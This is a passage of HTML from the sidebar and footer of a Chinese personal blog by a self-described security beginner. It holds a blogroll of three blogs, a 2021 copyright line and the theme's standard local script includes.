        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      大佬们
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://assassins-white.github.io/" title="https:&#x2F;&#x2F;assassins-white.github.io&#x2F;" rel="noopener" target="_blank">白神博客</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="http://www.ji4n.cn/" title="http:&#x2F;&#x2F;www.ji4n.cn&#x2F;" rel="noopener" target="_blank">Jen博客</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://blog.le31ei.top/" title="https:&#x2F;&#x2F;blog.le31ei.top&#x2F;" rel="noopener" target="_blank">le31ei博客</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">一灯和尚</span>
</div>
  <div class="powered-by">一只安全小菜鸡
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
